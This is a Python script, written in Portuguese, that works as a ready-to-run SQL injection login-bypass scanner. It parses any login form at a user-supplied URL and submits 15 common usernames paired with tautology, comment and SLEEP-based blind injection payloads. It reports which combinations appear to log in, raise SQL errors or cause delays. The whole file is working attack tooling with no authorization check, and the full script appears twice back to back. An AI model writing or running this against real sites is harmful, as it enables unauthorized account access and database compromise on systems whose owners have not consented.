import requests
from bs4 import BeautifulSoup
import time
import re

# Lista de payloads para SQL Injection (incluindo blind)
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR sleep(5)--",
    "' OR SLEEP(5) --",
    "\" OR \"\"=\"",
    "' OR ''='",
]

# Dicionário de nomes de usuário comuns
usernames = [
    "admin", "root", "user", "test", "guest",
    "admin1", "usuario", "login", "adm", "admin123",
    "test1", "user1", "manager", "owner", "support"
]

def blue_text(text):
    return f"\033[34m{text}\033[0m"

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        print(blue_text("[!] Nenhum formulário encontrado."))
        return None, None, None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = None
    pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')
        if not name:
            continue
        if input_type in ['text', 'email'] and not user_field:
            user_field = name
        elif input_type == 'password' and not pass_field:
            pass_field = name
        fields[name] = ''

    return action, method, fields, user_field, pass_field

def test_sql_injection(url):
    session = requests.Session()
    print(blue_text("[-] Acessando página de login..."))
    resp = session.get(url)
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)

    if not all([action, user_field, pass_field]):
        print(blue_text("[!] Não foi possível identificar os campos do formulário."))
        return

    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    working_payloads = []

    print(f"\n{blue_text('[*] Testando payloads...')}")

    for username in usernames:
        for payload in payloads:
            data = fields.copy()
            data[user_field] = username
            data[pass_field] = payload

            try:
                start_time = time.time()

                if method == 'post':
                    response = session.post(login_url, data=data)
                else:
                    response = session.get(login_url, params=data)

                duration = time.time() - start_time
                tempo = f"{duration:.2f}s"
                resposta = response.text.lower()

                sucesso = False
                blind = False
                erro_sql = False
                waf = False

                if any(kw in resposta for kw in ['bem-vindo', 'logout', 'painel', 'admin']):
                    sucesso = True
                elif response.url != login_url:
                    sucesso = True
                elif any(e in resposta for e in ['sql', 'syntax', 'mysql', 'warning', 'error']):
                    erro_sql = True
                elif duration >= 4.0:
                    blind = True
                elif any(w in resposta for w in ['captcha', 'access denied', 'waf', 'verifique']):
                    waf = True

                print(blue_text(f"Usuário: {username} | Payload: {payload} | Tempo: {tempo}"))

                if sucesso:
                    print(blue_text("→ ✅ Login possivelmente bem-sucedido!"))
                elif erro_sql:
                    print(blue_text("→ ⚠️ Erro SQL detectado"))
                elif blind:
                    print(blue_text("→ ⚠️ Resposta lenta: possível SQL Injection blind"))
                elif waf:
                    print(blue_text("→ 🚨 WAF suspeito detectado!"))
                else:
                    print(blue_text("→ - Sem resposta suspeita"))

                if sucesso or erro_sql or blind:
                    working_payloads.append((username, payload, tempo))

            except Exception as e:
                print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))

    print(blue_text("\n[✓] Testes finalizados."))
    if working_payloads:
        print(blue_text("\n[+] Payloads que deram resposta suspeita:"))
        for u, p, t in working_payloads:
            print(blue_text(f" - Usuário: {u} | Payload: {p} | Tempo: {t}"))
    else:
        print(blue_text("[-] Nenhuma falha aparente detectada."))

def main():
    print(blue_text("""
  /$$$$$$            /$$
 /$$__  $$          | $$
| $$  \__/  /$$$$$$ | $$
|  $$$$$$  /$$__  $$| $$
 \____  $$| $$  \ $$| $$
 /$$  \ $$| $$  | $$| $$
|  $$$$$$/|  $$$$$$$| $$
 \______/  \____  $$|__/
               | $$    
               | $$    
               |__/    
    """))

    print(blue_text("1. Testar SQL Injection em login"))
    print(blue_text("2. Sair"))

    while True:
        choice = input(blue_text("Escolha uma opção: ")).strip()
        if choice == "1":
            url = input(blue_text("Insira a URL da página de login: ")).strip()
            test_sql_injection(url)
        elif choice == "2":
            print(blue_text("Saindo..."))
            break
        else:
            print(blue_text("[!] Opção inválida. Tente novamente."))

if __name__ == '__main__':
    main()
import requests
from bs4 import BeautifulSoup
import time
import re

# Lista de payloads para SQL Injection (incluindo blind)
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR sleep(5)--",
    "' OR SLEEP(5) --",
    "\" OR \"\"=\"",
    "' OR ''='",
]

# Dicionário de nomes de usuário comuns
usernames = [
    "admin", "root", "user", "test", "guest",
    "admin1", "usuario", "login", "adm", "admin123",
    "test1", "user1", "manager", "owner", "support"
]

def blue_text(text):
    return f"\033[34m{text}\033[0m"

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        print(blue_text("[!] Nenhum formulário encontrado."))
        return None, None, None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = None
    pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')
        if not name:
            continue
        if input_type in ['text', 'email'] and not user_field:
            user_field = name
        elif input_type == 'password' and not pass_field:
            pass_field = name
        fields[name] = ''

    return action, method, fields, user_field, pass_field

def test_sql_injection(url):
    session = requests.Session()
    print(blue_text("[-] Acessando página de login..."))
    resp = session.get(url)
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)

    if not all([action, user_field, pass_field]):
        print(blue_text("[!] Não foi possível identificar os campos do formulário."))
        return

    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    working_payloads = []

    print(f"\n{blue_text('[*] Testando payloads...')}")

    for username in usernames:
        for payload in payloads:
            data = fields.copy()
            data[user_field] = username
            data[pass_field] = payload

            try:
                start_time = time.time()

                if method == 'post':
                    response = session.post(login_url, data=data)
                else:
                    response = session.get(login_url, params=data)

                duration = time.time() - start_time
                tempo = f"{duration:.2f}s"
                resposta = response.text.lower()

                sucesso = False
                blind = False
                erro_sql = False
                waf = False

                if any(kw in resposta for kw in ['bem-vindo', 'logout', 'painel', 'admin']):
                    sucesso = True
                elif response.url != login_url:
                    sucesso = True
                elif any(e in resposta for e in ['sql', 'syntax', 'mysql', 'warning', 'error']):
                    erro_sql = True
                elif duration >= 4.0:
                    blind = True
                elif any(w in resposta for w in ['captcha', 'access denied', 'waf', 'verifique']):
                    waf = True

                print(blue_text(f"Usuário: {username} | Payload: {payload} | Tempo: {tempo}"))

                if sucesso:
                    print(blue_text("→ ✅ Login possivelmente bem-sucedido!"))
                elif erro_sql:
                    print(blue_text("→ ⚠️ Erro SQL detectado"))
                elif blind:
                    print(blue_text("→ ⚠️ Resposta lenta: possível SQL Injection blind"))
                elif waf:
                    print(blue_text("→ 🚨 WAF suspeito detectado!"))
                else:
                    print(blue_text("→ - Sem resposta suspeita"))

                if sucesso or erro_sql or blind:
                    working_payloads.append((username, payload, tempo))

            except Exception as e:
                print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))

    print(blue_text("\n[✓] Testes finalizados."))
    if working_payloads:
        print(blue_text("\n[+] Payloads que deram resposta suspeita:"))
        for u, p, t in working_payloads:
            print(blue_text(f" - Usuário: {u} | Payload: {p} | Tempo: {t}"))
    else:
        print(blue_text("[-] Nenhuma falha aparente detectada."))

def main():
    print(blue_text("""
  /$$$$$$            /$$
 /$$__  $$          | $$
| $$  \__/  /$$$$$$ | $$
|  $$$$$$  /$$__  $$| $$
 \____  $$| $$  \ $$| $$
 /$$  \ $$| $$  | $$| $$
|  $$$$$$/|  $$$$$$$| $$
 \______/  \____  $$|__/
               | $$    
               | $$    
               |__/    
    """))

    print(blue_text("1. Testar SQL Injection em login"))
    print(blue_text("2. Sair"))

    while True:
        choice = input(blue_text("Escolha uma opção: ")).strip()
        if choice == "1":
            url = input(blue_text("Insira a URL da página de login: ")).strip()
            test_sql_injection(url)
        elif choice == "2":
            print(blue_text("Saindo..."))
            break
        else:
            print(blue_text("[!] Opção inválida. Tente novamente."))

if __name__ == '__main__':
    main()
